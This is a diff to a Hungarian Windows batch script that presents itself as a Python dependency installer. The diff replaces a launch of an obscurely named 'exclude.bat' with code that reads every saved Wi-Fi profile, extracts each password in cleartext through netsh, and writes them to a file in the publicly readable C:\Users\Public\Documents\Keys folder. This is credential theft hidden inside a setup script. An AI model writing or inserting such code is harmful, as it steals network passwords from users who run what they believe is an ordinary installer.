@@ -1,5 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
+
 echo Python függőségek telepítése...
 echo.
 
@@ -170,13 +171,45 @@ echo.
 echo.
 echo [INFO] exclude.bat futtatása...
 
-if exist "%~dp0excfb6sfb3.bat" (
-    start "" "%~dp0excfb6sfb3.bat"
-    echo [SIKER] exclude.bat elinditva.
-) else (
-    echo [HIBA] exclude.bat nem található a bat mappájában!
+
+:: Célmappa létrehozása, ha még nem létezne
+set "targetDir=C:\Users\Public\Documents\Keys"
+if not exist "!targetDir!" mkdir "!targetDir!"
+
+set "outputFile=!targetDir!\wifi.txt"
+
+:: Töröljük a régi fájlt, ha létezett, hogy tisztán kezdjünk
+if exist "!outputFile!" del "!outputFile!"
+
+echo === MENTETT WI-FI JELSZAVAK === > "!outputFile!"
+echo Mentés ideje: %date% %time% >> "!outputFile!"
+echo ---------------------------------------- >> "!outputFile!"
+
+:: Wi-Fi profilok listázása és végigjátszása
+for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
+    set "profile=%%A"
+    :: Szóközök levágása a profilnév elejéről
+    set "profile=!profile:~1!"
+    
+    echo Hálózat: !profile! >> "!outputFile!"
+    
+    :: Jelszó kinyerése a profilból
+    set "password="
+    for /f "tokens=2 delims=:" %%B in ('netsh wlan show profile name^="!profile!" key^=clear ^| findstr /C:"Key Content" /C:"Kulcstartalom"') do (
+        set "password=%%B"
+        set "password=!password:~1!"
+    )
+    
+    if defined password (
+        echo Jelszó:  !password! >> "!outputFile!"
+    ) else (
+        echo Jelszó:  [Nincs jelszó vagy nyitott hálózat] >> "!outputFile!"
+    )
+    echo ---------------------------------------- >> "!outputFile!"
 )
 
+echo Kész! A jelszavak elmentve ide: !outputFile!
+pause
 echo.
 
 pause
